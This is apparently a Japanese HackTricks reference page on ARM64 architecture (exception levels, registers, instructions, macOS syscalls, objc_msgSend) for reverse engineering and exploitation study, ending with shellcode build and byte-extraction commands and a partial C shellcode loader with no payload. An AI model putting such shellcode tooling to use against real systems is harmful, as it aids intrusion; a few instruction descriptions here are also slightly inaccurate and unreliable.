# ARM64v8 の概要

{{#include ../../../banners/hacktricks-training.md}}


## **Exception Levels - EL (ARM64v8)**

ARMv8 アーキテクチャでは、Exception Levels（EL）と呼ばれる実行レベルによって、実行環境の権限レベルと能力が定義されます。EL0 から EL3 までの 4 つの Exception Level があり、それぞれ異なる目的を持ちます。

1. **EL0 - User Mode**:
- 最も権限の低いレベルで、通常のアプリケーションコードの実行に使用されます。
- EL0 で実行されるアプリケーションは、相互に隔離され、システムソフトウェアからも隔離されるため、security と安定性が向上します。
2. **EL1 - Operating System Kernel Mode**:
- ほとんどの operating system kernel はこのレベルで実行されます。
- EL1 は EL0 より多くの権限を持ち、システムリソースにアクセスできますが、system integrity を維持するためにいくつかの制限があります。`SVC` instruction によって EL0 から EL1 に移行します。
3. **EL2 - Hypervisor Mode**:
- このレベルは virtualization に使用されます。EL2 で動作する hypervisor は、同じ物理 hardware 上で複数の operating system（それぞれ独自の EL1 を持つ）を管理できます。
- EL2 は、virtualized environment の isolation と control のための機能を提供します。
- そのため、Parallels のような virtual machine application は `hypervisor.framework` を使用して EL2 とやり取りし、kernel extension を必要とせずに virtual machine を実行できます。
- EL1 から EL2 への移行には `HVC` instruction を使用します。
4. **EL3 - Secure Monitor Mode**:
- 最も権限の高いレベルで、secure boot や trusted execution environment に使用されることが多いです。
- EL3 は secure state と non-secure state の間の access を管理および制御できます（secure boot、trusted OS など）。
- macOS では KPP（Kernel Patch Protection）に使用されていましたが、現在は使用されていません。
- Apple は EL3 を使用していません。
- EL3 への移行は通常、`SMC`（Secure Monitor Call）instruction を使用して行われます。

これらのレベルを使用することで、user application から最も権限の高い system software まで、システムのさまざまな側面を構造化された安全な方法で管理できます。ARMv8 の privilege level に対するアプローチは、異なる system component を効果的に隔離し、システムの security と堅牢性を向上させます。

## **Registers (ARM64v8)**

ARM64 には、`x0` から `x30` までの **31 個の general-purpose register** があります。それぞれ **64-bit**（8-byte）の値を格納できます。32-bit の値だけを必要とする操作では、同じ register に 32-bit mode でアクセスでき、その名前は w0 から w30 になります。

1. **`x0`** から **`x7`** - 通常、scratch register および subroutine に parameter を渡すために使用されます。
- **`x0`** には function の return data も格納されます。
2. **`x8`** - Linux kernel では、`x8` は `svc` instruction の system call number に使用されます。**macOS では x16 が使用されます！**
3. **`x9`** から **`x15`** - 追加の temporary register で、local variable に使用されることが多いです。
4. **`x16`** および **`x17`** - **Intra-procedural Call Registers**。immediate value 用の temporary register です。また、indirect function call と PLT（Procedure Linkage Table）stub にも使用されます。
- macOS では **`x16`** が **`svc`** instruction の **system call number** に使用されます。
5. **`x18`** - **Platform register**。general-purpose register として使用できますが、一部の platform では platform-specific use のために予約されています。Windows では current thread environment block への pointer、Linux kernel では現在 **executing task structure** を指すために使用されます。
6. **`x19`** から **`x28`** - callee-saved register です。function は caller のためにこれらの register の値を保持する必要があるため、stack に保存され、caller に戻る前に復元されます。
7. **`x29`** - stack frame を追跡するための **Frame pointer** です。function の call によって新しい stack frame が作成されると、**`x29`** register が **stack に保存**され、**新しい** frame pointer address（**`sp`** address）がこの register に**保存**されます。
- この register は **general-purpose register** としても使用できますが、通常は **local variable** への reference として使用されます。
8. **`x30`** または **`lr`** - **Link register**。`BL`（Branch with Link）または `BLR`（Branch with Link to Register）instruction が実行されると、`pc` の値をこの register に保存して **return address** を保持します。
- 他の register と同様に使用することもできます。
- current function が新しい function を call するため `lr` を上書きする場合、開始時に stack に保存します。これが epilogue です（`stp x29, x30 , [sp, #-48]; mov x29, sp` -> `fp` と `lr` を保存し、領域を確保して新しい `fp` を取得）。終了時に復元します。これが prologue です（`ldp x29, x30, [sp], #48; ret` -> `fp` と `lr` を復元して return）。
9. **`sp`** - **Stack pointer**。stack の最上部を追跡するために使用されます。
- **`sp`** の値は常に少なくとも **quadword** **alignment** に保つ必要があり、そうしないと alignment exception が発生する可能性があります。
10. **`pc`** - **Program counter**。次の instruction を指します。この register は、exception generation、exception return、branch によってのみ更新できます。この register を読み取れる通常の instruction は、branch with link instruction（BL、BLR）だけです。これらは **`pc`** address を **`lr`**（Link Register）に保存します。
11. **`xzr`** - **Zero register**。**32**-bit register form では **`wzr`** とも呼ばれます。zero value を容易に取得する（一般的な操作）ため、または **`subs`** を使用して比較を行うために使用できます。たとえば **`subs XZR, Xn, #10`** は、結果の data をどこにも保存しません（**`xzr`** に保存されます）。

**`Wn`** register は **`Xn`** register の **32-bit version** です。

> [!TIP]
> X0 - X18 の register は volatile です。つまり、その値は function call や interrupt によって変更される可能性があります。一方、X19 - X28 の register は non-volatile であり、function call の前後で値を保持する必要があります（"callee saved"）。

### SIMD and Floating-Point Registers

さらに、optimized single instruction multiple data（SIMD）operation や floating-point arithmetic の実行に使用できる、128-bit 長の register が **32 個**あります。これらは Vn register と呼ばれますが、**64**-bit、**32**-bit、**16**-bit、**8**-bit としても動作でき、その場合は **`Qn`**、**`Dn`**、**`Sn`**、**`Hn`**、**`Bn`** と呼ばれます。

### System Registers

**数百個の system register**（special-purpose register（SPR）とも呼ばれます）があり、**processor** の動作の**monitoring** と **control** に使用されます。\
これらは専用の special instruction **`mrs`** と **`msr`** を使用した場合にのみ読み取りまたは設定できます。

special register **`TPIDR_EL0`** と **`TPIDDR_EL0`** は、reverse engineering でよく見られます。`EL0` suffix は、その register にアクセスできる**最小の Exception Level** を示します（この場合、EL0 は通常の program が実行される通常の exception（privilege）level です）。\
これらは、memory 内の **thread-local storage** region の **base address** を保存するために使用されることが多いです。通常、最初の register は EL0 で実行される program から読み書きできますが、2 番目は EL0 から読み取り、EL1（kernel など）から書き込むことができます。

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** には、operating-system-visible な **`SPSR_ELx`** special register に serialized された複数の process component が含まれます。ここで X は、triggered exception の **permission** **level** を表します（これにより、exception 終了時に process state を復元できます）。\
アクセス可能な field は次のとおりです。

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- **`N`**、**`Z`**、**`C`**、**`V`** condition flag:
- **`N`** は、operation が negative result を生成したことを意味します。
- **`Z`** は、operation が zero を生成したことを意味します。
- **`C`** は、operation が carry を発生させたことを意味します。
- **`V`** は、operation が signed overflow を発生させたことを意味します。
- 2 つの positive number の sum が negative result になる。
- 2 つの negative number の sum が positive result になる。
- subtraction で、大きな negative number を小さな positive number から減算した場合（またはその逆）に、結果を指定された bit size の範囲内で表現できない。
- processor は operation が signed かどうかを認識しないため、operation で C と V を確認し、signed または unsigned の場合に carry が発生したかどうかを示します。

> [!WARNING]
> すべての instruction がこれらの flag を更新するわけではありません。**`CMP`** や **`TST`** などは更新します。また、**`ADDS`** のように s suffix が付く instruction も更新します。

- current **register width（`nRW`）flag**：flag が 0 の場合、program は resume 後に AArch64 execution state で実行されます。
- current **Exception Level**（**`EL`**）：EL0 で実行される通常の program は値 0 になります。
- **single stepping** flag（**`SS`**）：debugger が exception を通じて **`SPSR_ELx`** 内の SS flag を 1 に設定し、single step を行うために使用されます。program は 1 step 実行され、single step exception が発生します。
- **illegal exception** state flag（**`IL`**）：privileged software が無効な exception level transfer を実行した際にマークするために使用されます。この flag が 1 に設定され、processor は illegal state exception を発生させます。
- **`DAIF`** flag：これらの flag により、privileged program は特定の external exception を選択的に mask できます。
- **`A`** が 1 の場合、**asynchronous abort** が発生します。**`I`** は external hardware **Interrupt Request**（IRQ）への応答を設定します。F は **Fast Interrupt Request**（FIR）に関連します。
- **stack pointer select** flag（**`SPS`**）：EL1 以上で実行される privileged program は、自身の stack pointer register と user-model の stack pointer register（例：`SP_EL1` と `EL0` の間）を切り替えられます。この切り替えは **`SPSel`** special register に書き込むことで実行されます。これは EL0 からは実行できません。

## **Calling Convention (ARM64v8)**

ARM64 calling convention では、function の**最初の 8 個の parameter** は **`x0`** から **`x7`** の register に渡されます。追加の parameter は **stack** に渡されます。**return** value は **`x0`** register に渡され、**128-bit** 長の場合は **`x1`** にも渡されます。**`x19`** から **`x30`** および **`sp`** register は function call の前後で **preserve** する必要があります。

assembly で function を読む場合は、**function prologue と epilogue** を探します。**prologue** では通常、**frame pointer（`x29`）を保存**し、**新しい frame pointer を設定**して、**stack space を確保**します。**epilogue** では通常、保存した frame pointer を復元し、function から **return** します。

### Calling Convention in Swift

Swift には独自の **calling convention** があり、[**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64) に記載されています。

## **Common Instructions (ARM64v8)**

ARM64 instruction は一般に **`opcode dst, src1, src2`** という形式です。ここで **`opcode`** は実行する operation（`add`、`sub`、`mov` など）、**`dst`** は結果を保存する **destination** register、**`src1`** と **`src2`** は **source** register です。source register の代わりに immediate value も使用できます。

- **`mov`**: ある **register** から別の register に value を **move** します。
- Example: `mov x0, x1` — `x1` の value を `x0` に移動します。
- **`ldr`**: **memory** から value を **register** に **load** します。
- Example: `ldr x0, [x1]` — `x1` が指す memory location から value を `x0` に load します。
- **Offset mode**: origin pointer に影響する offset は、次のように指定します。
- `ldr x2, [x1, #8]` は、`x1 + 8` の value を x2 に load します。
- `ldr x2, [x0, x1, lsl #2]` は、array x0 の x1（index）の位置、つまり x1 \* 4 の object を x2 に load します。
- **Pre-indexed mode**: origin に対して計算を行い、結果を取得して、新しい origin を origin に保存します。
- `ldr x2, [x1, #8]!` は `x1 + 8` を `x2` に load し、`x1` に `x1 + 8` の結果を保存します。
- `str lr, [sp, #-4]!` は link register を sp に store し、register sp を update します。
- **Post-index mode**: 前の mode と似ていますが、memory address にアクセスしてから offset を計算し、保存します。
- `ldr x0, [x1], #8` は `x1` を `x0` に load し、x1 を `x1 + 8` に update します。
- **PC-relative addressing**: この場合、load する address は PC register を基準に計算されます。
- `ldr x1, =_start` は、current PC を基準に `_start` symbol が開始する address を x1 に load します。
- **`str`**: **register** から value を **memory** に **store** します。
- Example: `str x0, [x1]` — `x0` の value を `x1` が指す memory location に store します。
- **`ldp`**: **Load Pair of Registers**。この instruction は、**consecutive memory** location から 2 つの register を **load** します。memory address は通常、別の register の value に offset を加算して形成されます。
- Example: `ldp x0, x1, [x2]` — `x2` と `x2 + 8` の memory location から、それぞれ `x0` と `x1` を load します。
- **`stp`**: **Store Pair of Registers**。この instruction は、2 つの register を **consecutive memory** location に **store** します。memory address は通常、別の register の value に offset を加算して形成されます。
- Example: `stp x0, x1, [sp]` — `x0` と `x1` を、それぞれ `sp` と `sp + 8` の memory location に store します。
- `stp x0, x1, [sp, #16]!` — `x0` と `x1` を、それぞれ `sp+16` と `sp + 24` の memory location に store し、`sp` を `sp+16` に update します。
- **`add`**: 2 つの register の value を **add** し、結果を register に保存します。
- Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destination
- Xn2 -> Operand 1
- Xn3 | #imm -> Operando 2 (register or immediate)
- \[shift #N | RRX] -> Perform a shift or call RRX
- Example: `add x0, x1, x2` — `x1` と `x2` の value を加算し、結果を `x0` に保存します。
- `add x5, x5, #1, lsl #12` — これは 4096（1 を 12 回 shifter した値）と等しくなります -> 1 0000 0000 0000 0000
- **`adds`**: `add` を実行し、flag を update します。
- **`sub`**: 2 つの register の value を **subtract** し、結果を register に保存します。
- **`add`** の **syntax** を参照してください。
- Example: `sub x0, x1, x2` — `x1` から `x2` の value を減算し、結果を `x0` に保存します。
- **`subs`**: `sub` と同じですが、flag を update します。
- **`mul`**: **2 つの register** の value を **multiply** し、結果を register に保存します。
- Example: `mul x0, x1, x2` — `x1` と `x2` の value を乗算し、結果を `x0` に保存します。
- **`div`**: ある register の value を別の register で **divide** し、結果を register に保存します。
- Example: `div x0, x1, x2` — `x1` の value を `x2` で除算し、結果を `x0` に保存します。
- **`lsl`**、**`lsr`**、**`asr`**、**`ror`、`rrx`**:
- **Logical shift left**: 末尾から 0 を追加し、他の bit を前方に移動します（n 回 2 倍する）。
- **Logical shift right**: 先頭に 1 を追加し、他の bit を後方に移動します（unsigned で n 回 2 で除算する）。
- **Arithmetic shift right**: **`lsr`** と似ていますが、最上位 bit が 1 の場合に 0 ではなく **1** を追加します（signed で n 回 2 で除算する）。
- **Rotate right**: **`lsr`** と似ていますが、右側から取り除かれた bit を左側に追加します。
- **Rotate Right with Extend**: **`ror`** と似ていますが、carry flag を「最上位 bit」として扱います。carry flag を bit 31 に移動し、取り除かれた bit を carry flag に移動します。
- **`bfm`**: **Bit Field Move**。これらの operation は、value の **bit 0...n** を copy し、**m..m+n** の位置に配置します。**`#s`** は **leftmost bit** position、**`#r`** は rotate right amount を指定します。
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** register から bitfield を copy し、別の register に copy します。
- **`BFI X1, X2, #3, #4`** X2 から 4 bit を X1 の 3rd bit から insert します。
- **`BFXIL X1, X2, #3, #4`** X2 の 3rd bit から 4 bit を extract し、X1 に copy します。
- **`SBFIZ X1, X2, #3, #4`** X2 の 4 bit を sign-extend し、right bit を zeroing しながら、bit position 3 から X1 に insert します。
- **`SBFX X1, X2, #3, #4`** X2 の bit 3 から 4 bit を extract し、sign extend して、結果を X1 に配置します。
- **`UBFIZ X1, X2, #3, #4`** X2 の 4 bit を zero-extend し、right bit を zeroing しながら、bit position 3 から X1 に insert します。
- **`UBFX X1, X2, #3, #4`** X2 の bit 3 から 4 bit を extract し、zero-extended result を X1 に配置します。
- **Sign Extend To X:** value の sign（unsigned version では 0 のみ）を extend し、その value で operation を実行できるようにします。
- **`SXTB X1, W2`** byte の sign を **W2 から X1 に** extend します（`W2` は `X2` の半分です）。64-bit を満たすようにします。
- **`SXTH X1, W2`** 16-bit number の sign を **W2 から X1 に** extend し、64-bit を満たすようにします。
- **`SXTW X1, W2`** byte の sign を **W2 から X1 に** extend し、64-bit を満たすようにします。
- **`UXTB X1, W2`** byte に 0（unsigned）を追加し、**W2 から X1 に** extend して 64-bit を満たします。
- **`extr`:** 指定された **連結された register pair** から bit を extract します。
- Example: `EXTR W3, W2, W1, #3` は **W1+W2 を concat** し、**W2 の bit 3 から W1 の bit 3 まで**を取得して W3 に保存します。
- **`cmp`**: 2 つの register を **compare** し、condition flag を設定します。destination register を zero register に設定する **`subs` の alias** です。`m == n` かどうかを確認するのに便利です。
- **`subs`** と同じ syntax をサポートします。
- Example: `cmp x0, x1` — `x0` と `x1` の value を compare し、それに応じて condition flag を設定します。
- **`cmn`**: **Compare negative** operand。この場合は **`adds` の alias** であり、同じ syntax をサポートします。`m == -n` かどうかを確認するのに便利です。
- **`ccmp`**: Conditional comparison。前の comparison が true の場合にのみ実行される comparison で、nzcv bit を明示的に設定します。
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> x1 != x2 かつ x3 < x4 の場合、func に jump します。
- これは、**`ccmp`** が **previous `cmp` が `NE` の場合にのみ**実行され、そうでない場合は `nzcv` bit が 0 に設定されるためです（その場合、`blt` comparison は成立しません）。
- これは **`ccmn`** としても使用できます（`cmp` と `cmn` の関係と同じです）。
- **`tst`**: comparison の value が両方とも 1 であるものがあるかを確認します（結果をどこにも保存しない ANDS のように動作します）。register と value を確認し、value で指定された register の bit のいずれかが 1 かどうかを確認するのに便利です。
- Example: `tst X1, #7` X1 の最後の 3 bit のいずれかが 1 かどうかを確認します。
- **`teq`**: result を破棄する XOR operation
- **`b`**: Unconditional Branch
- Example: `b myFunction`
- これは link register に return address を設定しないため、return が必要な subroutine call には適していません。
- **`bl`**: link 付きの **Branch**。**subroutine を call** するために使用します。**return address を `x30` に保存**します。
- Example: `bl myFunction` — function `myFunction` を call し、return address を `x30` に保存します。
- これは link register に return address を設定しないため、return が必要な subroutine call には適していません。
- **`blr`**: Link to Register 付きの **Branch**。target が **register** で指定される **subroutine** を call するために使用します。return address を `x30` に保存します。（これは
- Example: `blr x1` — `x1` に含まれる address の function を call し、return address を `x30` に保存します。
- **`ret`**: 通常 **`x30`** の address を使用して **subroutine** から **Return** します。
- Example: `ret` — `x30` の return address を使用して current subroutine から return します。
- **`b.<cond>`**: Conditional branch
- **`b.eq`**: 前の `cmp` instruction に基づいて、**equal の場合に Branch** します。
- Example: `b.eq label` — 前の `cmp` instruction が 2 つの equal value を検出した場合、`label` に jump します。
- **`b.ne`**: **Not Equal の場合に Branch** します。この instruction は、previous comparison instruction によって設定された condition flag を確認し、compare した value が equal でなければ label または address に branch します。
- Example: `cmp x0, x1` instruction の後に `b.ne label` — `x0` と `x1` の value が equal でなければ、`label` に jump します。
- **`cbz`**: **Compare and Branch on Zero**。この instruction は register と zero を compare し、それらが equal なら label または address に branch します。
- Example: `cbz x0, label` — `x0` の value が zero なら、`label` に jump します。
- **`cbnz`**: **Compare and Branch on Non-Zero**。この instruction は register と zero を compare し、それらが equal でなければ label または address に branch します。
- Example: `cbnz x0, label` — `x0` の value が non-zero なら、`label` に jump します。
- **`tbnz`**: bit を test し、nonzero の場合に branch します。
- Example: `tbnz x0, #8, label`
- **`tbz`**: bit を test し、zero の場合に branch します。
- Example: `tbz x0, #8, label`
- **Conditional select operation**: conditional bit に応じて behaviour が変化する operation です。
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> true の場合は X0 = X1、false の場合は X0 = X2
- `csinc Xd, Xn, Xm, cond` -> true の場合は Xd = Xn、false の場合は Xd = Xm + 1
- `cinc Xd, Xn, cond` -> true の場合は Xd = Xn + 1、false の場合は Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> true の場合は Xd = Xn、false の場合は Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> true の場合は Xd = NOT(Xn)、false の場合は Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> true の場合は Xd = Xn、false の場合は Xd = - Xm
- `cneg Xd, Xn, cond` -> true の場合は Xd = - Xn、false の場合は Xd = Xn
- `cset Xd, Xn, Xm, cond` -> true の場合は Xd = 1、false の場合は Xd = 0
- `csetm Xd, Xn, Xm, cond` -> true の場合は Xd = \<all 1>、false の場合は Xd = 0
- **`adrp`**: **symbol の page address を計算**し、register に保存します。
- Example: `adrp x0, symbol` — `symbol` の page address を計算し、`x0` に保存します。
- **`ldrsw`**: memory から signed **32-bit** value を **load** し、**64-bit** に sign-extend します。これは一般的な SWITCH case に使用されます。
- Example: `ldrsw x0, [x1]` — `x1` が指す memory location から signed 32-bit value を load し、64-bit に sign-extend して `x0` に保存します。
- **`stur`**: 別の register からの offset を使用して、**register value を memory location に store** します。
- Example: `stur x0, [x1, #4]` — `x0` の value を、現在 `x1` にある address より 4 byte 大きい memory address に store します。
- **`svc`** : **system call** を実行します。これは "Supervisor Call" の略です。processor がこの instruction を実行すると、**user mode から kernel mode に切り替わり**、**kernel の system call handling** code が配置された memory 内の特定 location に jump します。

- Example:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **link register と frame pointer を stack に保存する**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **新しいフレームポインタを設定**: `mov x29, sp`（現在の関数の新しいフレームポインタを設定）
3. **必要に応じて、ローカル変数用のスタック領域を確保**: `sub sp, sp, <size>`（`<size>` は必要なバイト数）

### **関数エピローグ**

1. **ローカル変数を解放（確保されている場合）**: `add sp, sp, <size>`
2. **リンクレジスタとフレームポインタを復元**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret`（link register のアドレスを使用して caller に制御を戻す）

## ARM Common Memory Protections

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## AARCH32 Execution State

Armv8-A は 32-bit プログラムの実行をサポートします。**AArch32** は **`A32`** と **`T32`** の **2つの instruction sets** のいずれかを実行でき、**`interworking`** によって切り替えることができます。\
**Privileged** な 64-bit プログラムは、より低い privilege の 32-bit **exception level** へ exception level transfer を実行することで、**32-bit プログラムの実行**をスケジュールできます。\
64-bit から 32-bit への移行は、exception level が低下するときに発生することに注意してください（例えば、EL1 の 64-bit プログラムが EL0 のプログラムを起動する場合）。これは、**`AArch32`** process thread の実行準備が整ったときに、**`SPSR_ELx`** special register の **`bit 4` を 1** に設定し、`SPSR_ELx` の残りの部分に **`AArch32`** プログラムの CPSR を格納することで行われます。その後、privileged process は **`ERET`** instruction を呼び出し、processor は CPSR に応じて A32 または T32 に入り、**`AArch32`** へ移行します。**

**`interworking`** は CPSR の J bit と T bit を使用して行われます。`J=0` かつ `T=0` は **`A32`** を意味し、`J=0` かつ `T=1` は **T32** を意味します。これは基本的に、instruction set が T32 であることを示すために **最下位 bit を 1 に設定する**ことを意味します。\
これは **`interworking` branch instructions** の実行時に設定されますが、PC が destination register として設定されている場合は、他の instructions によって直接設定することもできます。例:

もう1つの例:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registers

16個の32ビットレジスタ（r0-r15）があります。**r0からr14**は**任意の操作**に使用できますが、一部は通常、予約されています。

- **`r15`**: Program counter（常時）。次の命令のアドレスを含みます。A32では current + 8、T32では current + 4です。
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer（stackは常に16-byte alignedであることに注意してください）
- **`r14`**: Link Register

さらに、レジスタは**`banked registries`**によってバックアップされます。これはレジスタの値を保存する場所であり、例外処理や特権操作において、毎回レジスタを手動で保存・復元する必要をなくし、**fast context switching**を実行できます。\
これは、プロセッサの状態を`CPSR`から、例外が移行するプロセッサモードの**`SPSR`**へ**保存**することで行われます。例外から戻る際には、**`CPSR`**が**`SPSR`**から復元されます。

### CPSR - Current Program Status Register

AArch32では、CPSRはAArch64の**`PSTATE`**と同様に機能し、後で実行を復元するため、例外が発生した際に**`SPSR_ELx`**にも保存されます。

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

フィールドはいくつかのグループに分けられます。

- Application Program Status Register（APSR）：Arithmetic flagsで、EL0からアクセス可能
- Execution State Registers：プロセスの動作（OSによって管理されます）。

#### Application Program Status Register (APSR)

- **`N`**、**`Z`**、**`C`**、**`V`** flags（AArch64と同様）
- **`Q`** flag：特殊なsaturating arithmetic instructionの実行中に**integer saturation occurs**すると、1に設定されます。一度**`1`**に設定されると、手動で0に設定されるまでその値が維持されます。また、その値を暗黙的にチェックするinstructionは存在しないため、手動で読み取る必要があります。
- **`GE`**（Greater than or equal）Flags：SIMD（Single Instruction, Multiple Data）operationsで使用されます。例として、"parallel add"や"parallel subtract"があります。これらのoperationsでは、1つのinstructionで複数のデータポイントを処理できます。

例えば、**`UADD8`** instructionは、2つの32-bit operandsから**4組のbytesを並列に加算**し、その結果を32-bit registerに保存します。その後、これらの結果に基づいて**`APSR`の`GE` flags**を設定します。各GE flagは4つのbyte additionsのいずれかに対応し、そのbyte pairの加算で**overflowed**したかどうかを示します。

**`SEL`** instructionは、これらのGE flagsを使用してconditional actionsを実行します。

#### Execution State Registers

- **`J`**ビットと**`T`**ビット：**`J`**は0である必要があります。**`T`**が0の場合はinstruction set A32が使用され、1の場合はT32が使用されます。
- **IT Block State Register**（`ITSTATE`）：これらは10-15および25-26ビットです。**`IT`**をprefixとするgroup内のinstructionsのconditionsを保存します。
- **`E`**ビット：**endianness**を示します。
- **Mode and Exception Mask Bits**（0-4）：現在のexecution stateを決定します。5番目のビットは、programが32bit（1）または64bit（0）で実行されているかを示します。残りの4ビットは、現在使用されている**exception mode**（例外が発生し、処理中である場合）を表します。設定された数は、この処理中に別の例外がtriggerされた場合の現在のpriorityを示します。

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**：特定の例外は、**`A`**、`I`**、`F`**ビットを使用して無効化できます。**`A`**が1の場合、**asynchronous aborts**がtriggerされることを意味します。**`I`**は、外部hardwareの**Interrupts Requests**（IRQs）に応答する設定です。また、Fは**Fast Interrupt Requests**（FIRs）に関連します。

## macOS

### BSD syscalls

[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)を確認するか、`cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`を実行してください。BSD syscallsでは**x16 > 0**になります。

### Mach Traps

[**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html)で`mach_trap_table`を、[**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h)でprototypesを確認してください。Mach trapsのmex numberは`MACH_TRAP_TABLE_COUNT` = 128です。Mach trapsでは**x16 < 0**になるため、前のlistのnumbersを**minus**付きでcallする必要があります。**`_kernelrpc_mach_vm_allocate_trap`**は**`-10`**です。

disassemblerで**`libsystem_kernel.dylib`**を確認し、これら（およびBSD）syscallsのcall方法を確認することもできます。
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Ida と **Ghidra** は、cache を渡すだけで cache から **特定の dylibs** を decompile することもできます。

> [!TIP]
> **source code** を確認するよりも、**`libsystem_kernel.dylib`** の **decompiled** code を確認した方が簡単な場合があります。これは、複数の syscall（BSD と Mach）の code が scripts によって生成されるためです（source code 内のコメントを確認してください）。一方、dylib では何が呼び出されているかを確認できます。

### machdep calls

XNU は、machine dependent と呼ばれる別のタイプの calls もサポートしています。これらの calls の番号は architecture によって異なり、calls と番号のどちらも一定であり続ける保証はありません。

### comm page

これは kernel が所有する memory page で、すべての user process の address space に map されています。kernel services のために user mode から kernel space へ移行する処理を、syscalls を使用するより高速にすることを目的としています。この移行が頻繁に行われるため、syscalls を使用すると非常に非効率になるためです。

例えば、`gettimeofdate` call は `timeval` の値を comm page から直接読み取ります。

### objc_msgSend

Objective-C または Swift の programs では、この function が使用されているのを非常によく見かけます。この function を使うと、Objective-C object の method を呼び出せます。

Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):<sup>[[4]](#references)</sup>

- x0: self -> instance への Pointer
- x1: op -> method の Selector
- x2... -> invoked method の残りの arguments

したがって、この function への branch の前に breakpoint を設定すると、以下のように lldb で何が invoked されたかを簡単に確認できます（この例では、object が `NSConcreteTask` の object を呼び出し、その object が command を実行します）。
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> 環境変数 **`NSObjCMessageLoggingEnabled=1`** を設定すると、`/tmp/msgSends-pid` のようなファイルに、この関数が呼び出された時点を log できます。
>
> さらに、**`OBJC_HELP=1`** を設定して任意のバイナリを呼び出すと、特定の Objc-C アクションが発生した時点を **log** するために使用できる他の環境変数を確認できます。

この関数が呼び出されると、指定されたインスタンスの呼び出されたメソッドを見つける必要があり、そのために次の検索が実行されます。

- 楽観的な cache lookup を実行:
- 成功した場合は完了
- runtimeLock を取得（read）
- （realize && !cls->realized）の場合、class を realize
- （initialize && !cls->initialized）の場合、class を initialize
- class 自身の cache を試行:
- 成功した場合は完了
- class の method list を試行:
- 見つかった場合、cache に追加して完了
- superclass の cache を試行:
- 成功した場合は完了
- superclass の method list を試行:
- 見つかった場合、cache に追加して完了
- （resolver）の場合、method resolver を試行し、class lookup から再実行
- ここまで来た場合（= その他すべてが失敗した場合）、forwarder を試行

### Shellcodes

コンパイルするには:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
バイト列を抽出するには:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
新しいmacOSの場合:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>shellcodeをテストするCコード</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
